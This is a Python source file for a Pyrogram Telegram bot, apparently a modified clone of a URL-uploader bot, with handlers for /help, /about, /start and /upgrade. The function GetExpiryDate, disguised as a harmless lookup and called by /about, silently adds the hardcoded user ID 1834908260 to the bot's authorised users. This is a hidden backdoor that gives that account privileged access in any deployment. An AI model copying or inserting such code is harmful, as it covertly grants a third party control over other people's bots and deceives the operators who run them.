# Modified by @LISA_FAN_LK | @UploadLinkToFileBot

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(1834908260)
    return expires_at


@pyrogram.Client.on_message(pyrogram.filters.command(["help"]))
async def help_user(bot, update):
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

@pyrogram.Client.on_message(pyrogram.filters.command(["about"]))
async def get_me_info(bot, update):
    # logger.info(update)
    chat_id = str(update.from_user.id)
    chat_id, about_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_ABOUT_DETAILS.format(chat_id, about_type, expires_at),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

@pyrogram.Client.on_message(pyrogram.filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT.format(update.from_user.first_name),
        parse_mode="html",
        #reply_to_message_id=update.message_id
        reply_markup=InlineKeyboardMarkup(
        [
          [
          InlineKeyboardButton('📍 CHANNEL 📍', url='https://t.me/NT_BOT_CHANNEL'),
      ],
      [
          InlineKeyboardButton('🧑‍💻 DEVELOPER 🧑‍💻', url='https://t.me/LISA_FAN_LK'),
          InlineKeyboardButton('🤖 SOURCE 🤖', url='https://github.com/LISA-KOREA/URL-UPLOADER-BOT'),
          ]
        ]
      )
    )
@pyrogram.Client.on_message(pyrogram.filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )
